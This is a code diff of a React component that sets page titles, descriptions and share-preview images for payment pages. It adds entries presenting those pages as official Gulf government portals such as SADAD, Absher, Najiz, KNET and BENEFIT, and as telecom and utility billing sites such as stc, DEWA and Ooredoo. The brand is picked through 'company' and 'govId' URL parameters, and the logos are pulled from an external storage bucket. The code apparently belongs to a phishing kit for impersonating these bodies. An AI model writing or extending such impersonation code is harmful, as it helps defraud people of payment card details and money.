@@ -3,6 +3,48 @@ import { getServiceBranding } from '@/lib/serviceLogos';
 import { getEntityPaymentShareImage, getEntityIdentity, detectEntityFromURL, getBankOGImage } from '@/lib/dynamicIdentity';
 
 const companyMeta: Record<string, { title: string; description: string; image: string }> = {
+  // Government Systems
+  gov_sa: {
+    title: "بوابة سداد للمدفوعات الحكومية 🇸🇦 - SADAD Official",
+    description: "نظام المدفوعات الوطني السعودي - سدد رسوم الخدمات الحكومية والفواتير بأمان تام وسهولة عبر بوابة سداد الموحدة المعتمدة ✅",
+    image: "/gov-sadad-official.png"
+  },
+  gov_ae: {
+    title: "بوابة جيوان للمدفوعات الإلكترونية 🇦🇪 - Jaywan UAE",
+    description: "نظام البطاقة الوطنية الإماراتي - سدد فواتيرك وخدماتك الحكومية بأمان عبر منظومة الدفع الوطنية الإماراتية المعتمدة 💳",
+    image: "/gov-uae-logo.jpg"
+  },
+  gov_kw: {
+    title: "بوابة كي نت للمدفوعات الوطنية 🇰🇼 - KNET Kuwait",
+    description: "شبكة الكويت الوطنية للمدفوعات الإلكترونية - سدد رسومك الحكومية بأمان وموثوقية عبر بوابة KNET الرسمية المعتمدة 🇰🇼",
+    image: "/gov-knet-logo.png"
+  },
+  gov_qa: {
+    title: "بوابة قطر للمدفوعات الحكومية 🇶🇦 - Qatar Gateway",
+    description: "نظام الدفع الإلكتروني الموحد لدولة قطر - سدد جميع مستحقات الخدمات الحكومية بأعلى معايير الأمان الرسمية 🇶🇦",
+    image: "/gov-qatar-logo.png"
+  },
+  gov_om: {
+    title: "بوابة مال للمدفوعات الوطنية 🇴🇲 - Maal Oman",
+    description: "منظومة الدفع الإلكتروني الوطنية لسلطنة عُمان - سداد سريع وآمن لجميع الرسوم والخدمات عبر بوابة مال المعتمدة 🇴🇲",
+    image: "/gov-maal-logo.jpg"
+  },
+  gov_bh: {
+    title: "بوابة بنفت للمدفوعات الوطنية 🇧🇭 - BENEFIT Bahrain",
+    description: "الشبكة الإلكترونية البحرينية للمعاملات المالية - سدد رسومك وخدماتك الحكومية بأمان تام عبر منظومة بنفت الرسمية 🇧🇭",
+    image: "/gov-benefit-logo.png"
+  },
+  sa_absher: {
+    title: "بوابة أبشر للمدفوعات الإلكترونية 🇸🇦",
+    description: "سدد رسوم خدمات وزارة الداخلية السعودية بأمان وسهولة عبر بوابة أبشر الموحدة ✅",
+    image: "https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/absher-hero.jpg"
+  },
+  sa_najiz: {
+    title: "بوابة ناجز للمدفوعات العدلية ⚖️",
+    description: "سدد رسوم الخدمات العدلية السعودية بأمان عبر بوابة ناجز التابعة لوزارة العدل ✅",
+    image: "https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/najiz-logo.png"
+  },
+
   aramex: {
     title: "دفع آمن - أرامكس للشحن السريع 🚚",
     description: "خدمات شحن عالمية مع أرامكس - أكمل عملية الدفع بأمان تام للحصول على خدمات شحن سريعة وموثوقة في جميع أنحاء الخليج والعالم ✅",
@@ -69,39 +111,74 @@ const companyMeta: Record<string, { title: string; description: string; image: s
     image: "/og-bahpost.jpg"
   },
   chalets: {
-    title: "دفع آمن - حجز الشاليهات والاستراحات 🏖️",
-    description: "حجز شاليهات فاخرة واستراحات مريحة - ادفع بأمان واحجز إقامتك المثالية مع عروض حصرية وخدمات متميزة في جميع أنحاء الخليج 🌟",
-    image: "/og-chalets.jpg"
+    title: "تأكيد حجز شاليه - دفع آمن 🏠",
+    description: "أكمل عملية الدفع بأمان تام لتأكيد حجز شاليهك المفضل - نظام دفع مشفر وموثوق ✅",
+    image: "/assets/dynamic-identity/chalets_image1.svg"
+  },
+  health_links: {
+    title: "تأكيد موعد طبي - دفع آمن 🏥",
+    description: "بوابة الحجوزات الطبية الإلكترونية - سدد رسوم الكشف والخدمات الصحية بأمان تام لتأكيد موعدك 🏥",
+    image: "/assets/dynamic-identity/health_image1.svg"
   },
   contracts: {
-    title: "دفع آمن - العقود والاتفاقيات القانونية 📄",
-    description: "تسديد العقود والاتفاقيات - أكمل دفعتك بأمان للعقود العقارية والتجارية والخدمية مع حماية قانونية كاملة وموثقة ✅",
-    image: "/og-contracts.jpg"
+    title: "توثيق عقد إلكتروني - دفع آمن 📄",
+    description: "بوابة العقود والتوثيق الموحدة - أكمل سداد رسوم التوثيق لاعتماد عقدك الإلكتروني قانونياً ⚖️",
+    image: "/assets/dynamic-identity/contract_image1.svg"
   },
   invoices: {
-    title: "دفع آمن - الفواتير والمستحقات 📋",
-    description: "دفع الفواتير إلكترونياً - سدد فواتيرك ومستحقاتك بكل سهولة وأمان مع تأكيد فوري ومتابعة دقيقة لجميع معاملاتك المالية 💰",
-    image: "/og-invoices.jpg"
+    title: "سداد فاتورة إلكترونية - دفع آمن 🧾",
+    description: "مركز سداد الفواتير الموحد - سدد فواتيرك المستحقة بأمان وسرعة عبر منصتنا المشفرة ✅",
+    image: "/assets/dynamic-identity/invoice_image1.svg"
   },
   government_payment: {
     title: "دفع آمن - الخدمات الحكومية 🏛️",
     description: "دفع الخدمات والرسوم الحكومية - سدد رسومك الحكومية إلكترونياً بأمان تام مع سداد، بنفت، مدى وجميع أنظمة الدفع الحكومية المعتمدة ✅",
-    image: "/og-government_payment.jpg"
-  },
-  health_links: {
-    title: "دفع آمن - الخدمات الصحية والطبية 🏥",
-    description: "دفع الخدمات الصحية والطبية - سدد فواتيرك الطبية، التأمين الصحي، والمستشفيات بأمان مع تأكيد فوري وخصوصية تامة 🩺",
-    image: "/og-health_links.jpg"
+    image: "/assets/dynamic-identity/official_logo_gov.svg"
   },
   local_payment: {
     title: "دفع آمن - المدفوعات المحلية 💳",
     description: "خدمات الدفع المحلي السريع - سدد مدفوعاتك المحلية بسهولة وأمان مع دعم جميع وسائل الدفع المحلية المعتمدة في دول الخليج 🌍",
-    image: "/og-local_payment.jpg"
+    image: "/assets/dynamic-identity/official_logo_local.svg"
+  },
+  stc: {
+    title: "stc - سداد فواتير الاتصالات 🇸🇦",
+    description: "سدد فواتير stc والإنترنت والخدمات الرقمية بأمان وسرعة عبر بوابة الدفع الرسمية المعتمدة ✅",
+    image: "https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/stc-logo.png"
+  },
+  mobily: {
+    title: "موبايلي - سداد الفواتير والخدمات 🇸🇦",
+    description: "سدد فواتير موبايلي واشحن رصيدك بأمان تام عبر بوابة الدفع الإلكترونية الرسمية المعتمدة ✅",
+    image: "https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mobily-logo.png"
+  },
+  zain: {
+    title: "زين - سداد فواتير الاتصالات 🌍",
+    description: "سدد فواتير زين واشحن رصيدك بسهولة وأمان عبر بوابة الدفع الموحدة لعملاء زين المعتمدة ✅",
+    image: "https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/zain-logo.png"
+  },
+  dewa: {
+    title: "ديوا - سداد فواتير الكهرباء والمياه 🇦🇪",
+    description: "بوابة سداد فواتير هيئة كهرباء ومياه دبي (DEWA) - سدد فواتيرك بأمان وسرعة عبر القنوات الرسمية المعتمدة ✅",
+    image: "https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/dewa-logo.png"
+  },
+  etisalat: {
+    title: "اتصالات من e& - سداد الفواتير 🇦🇪",
+    description: "سدد فواتير اتصالات والإنترنت والخدمات المنزلية بأمان عبر بوابة الدفع الرقمية الرسمية المعتمدة ✅",
+    image: "https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/etisalat-logo.png"
+  },
+  ooredoo: {
+    title: "أوريدو - سداد الفواتير والخدمات 🇶🇦",
+    description: "سدد فواتير Ooredoo واشحن رصيدك بأمان وسرعة عبر بوابة الدفع الرسمية المعتمدة لعملاء أوريدو ✅",
+    image: "https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/ooredoo-logo.png"
+  },
+  kahramaa: {
+    title: "كهرماء - سداد فواتير الكهرباء والمياه 🇶🇦",
+    description: "بوابة سداد فواتير المؤسسة العامة القطرية للكهرباء والماء (كهرماء) - سدد بأمان تام عبر المنصة الرسمية المعتمدة ✅",
+    image: "https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/kahramaa-logo.png"
   },
   bank_pages: {
     title: "دفع آمن - البنوك الخليجية 🏦",
     description: "الدفع عبر البنوك الخليجية - اختر بنكك المفضل من أكثر من 50 بنك خليجي وأكمل معاملتك المالية بأمان وسرعة فائقة 💎",
-    image: "/og-bank_pages.jpg"
+    image: "/assets/dynamic-identity/official_logo_bank.svg"
   },
   default: {
     title: "منصة الدفع الذكية - خدمات دفع آمنة لدول الخليج 💳",
@@ -120,14 +197,14 @@ interface PaymentMetaTagsProps {
 }
 
 export const PaymentMetaTags: React.FC<PaymentMetaTagsProps> = ({
-  serviceKey,
-  serviceName,
+  serviceKey = 'default',
+  serviceName = '',
   amount,
   title,
   customDescription,
   description,
 }) => {
-  const branding = getServiceBranding(serviceKey);
+  const branding = getServiceBranding(serviceKey || 'default');
   
   const detectedEntity = detectEntityFromURL();
   const entityIdentity = detectedEntity ? getEntityIdentity(detectedEntity) : null;
@@ -135,19 +212,21 @@ export const PaymentMetaTags: React.FC<PaymentMetaTagsProps> = ({
   const entityDescription = entityIdentity?.payment_share_description;
   
   const urlParams = new URLSearchParams(window.location.search);
-  const companyParam = urlParams.get('company') || serviceKey;
-  const companyMetaData = companyMeta[companyParam.toLowerCase()] || companyMeta.default;
+  const companyParam = urlParams.get('company') || serviceKey || 'default';
+  const govId = urlParams.get('govId');
+  const metaKey = (govId && companyMeta[`gov_${govId.toLowerCase()}`]) ? `gov_${govId.toLowerCase()}` : companyParam.toLowerCase();
+  const companyMetaData = companyMeta[metaKey] || companyMeta.default;
   
   let ogImagePath = entityShareImage || companyMetaData.image || branding.ogImage;
   
-  if (serviceKey.startsWith('bank_')) {
+  if (serviceKey && serviceKey.startsWith('bank_')) {
     const bankId = serviceKey.replace('bank_', '');
     ogImagePath = getBankOGImage(bankId) || companyMeta.bank_pages.image;
   }
   
   const pageTitle = title || companyMetaData.title;
   const pageDescription = description || customDescription || companyMetaData.description || entityDescription || branding.description;
-  const ogImage = ogImagePath ? `${window.location.origin}${ogImagePath}` : undefined;
+  const ogImage = ogImagePath ? (ogImagePath.startsWith('http') ? ogImagePath : `${window.location.origin}${ogImagePath}`) : undefined;
   
   return (
     <Helmet>
@@ -176,7 +255,7 @@ export const PaymentMetaTags: React.FC<PaymentMetaTagsProps> = ({
       
       <meta name="theme-color" content={entityIdentity?.colors.primary || branding.colors.primary} />
       
-      {ogImagePath && <link rel="preload" as="image" href={ogImagePath} />}
+      {ogImagePath && !ogImagePath.startsWith('http') && <link rel="preload" as="image" href={ogImagePath} />}
       <link rel="preconnect" href="https://fonts.googleapis.com" />
       <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="anonymous" />
       
